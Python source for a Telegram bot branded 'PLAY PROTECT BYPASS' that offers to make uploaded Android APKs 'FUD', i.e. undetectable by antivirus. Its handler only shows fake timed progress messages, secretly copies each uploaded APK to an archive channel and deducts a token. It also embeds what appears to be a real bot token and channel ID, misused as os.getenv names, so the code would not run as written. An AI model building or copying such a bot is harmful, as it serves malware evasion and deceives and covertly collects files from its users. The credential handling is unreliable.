import os
import asyncio
import logging

from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)

logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv("8800939233:AAH3DTYrSr1JtIkdNLUXM2BohMK8gV-XGC4")
ARCHIVE_CHANNEL_ID = int(os.getenv("-1003984869234"))

TOKENS = {}


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    if user.id not in TOKENS:
        TOKENS[user.id] = 5

    msg = (
        f"👋 Welcome to PLAY PROTECT BYPASS\n\n"
        f"🆔 User ID: {user.id}\n"
        f"💎 Paid User: No\n"
        f"🎟 Available Tokens: {TOKENS[user.id]}\n\n"
        f"(Processing one APK consumes one token)\n\n"
        f"⚠️ Trial Version: Each APK works 14 days only.\n\n"
        f"📤 Now send an APK file to this bot."
    )

    await update.message.reply_text(msg)


async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    doc = update.message.document

    if not doc:
        return

    if not doc.file_name.lower().endswith(".apk"):
        await update.message.reply_text(
            "❌ Please send only .apk files."
        )
        return

    if user.id not in TOKENS:
        TOKENS[user.id] = 5

    if TOKENS[user.id] <= 0:
        await update.message.reply_text(
            "❌ No tokens remaining. Contact admin for more."
        )
        return

    try:
        status = await update.message.reply_text(
            "📤 APK Received...\n\n⏳ Initializing..."
        )

        await asyncio.sleep(1)
        await status.edit_text("🔄 Processing... 25%")

        await asyncio.sleep(1)
        await status.edit_text("🔄 Processing... 50%")

        await asyncio.sleep(1)
        await status.edit_text("🔄 Processing... 75%")

        await context.bot.copy_message(
            chat_id=ARCHIVE_CHANNEL_ID,
            from_chat_id=update.effective_chat.id,
            message_id=update.message.message_id,
        )

        TOKENS[user.id] -= 1

        await asyncio.sleep(1)

        await status.edit_text(
            "🚀 FUD IN PROCESS...\n\n"
            "⏳ Please wait while your request is being processed.\n"
            f"🎟 Remaining Tokens: {TOKENS[user.id]}"
        )

        logger.info(
            f"APK archived from {user.id}. Tokens left: {TOKENS[user.id]}"
        )

    except Exception as e:
        logger.error(e)

        await update.message.reply_text(
            "❌ Failed to save APK. Please try again later."
        )


def main():
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN not found.")
        return

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(
        MessageHandler(filters.Document.ALL, handle_file)
    )

    logger.info("Bot Started...")
    app.run_polling()


if __name__ == "__main__":
    main()
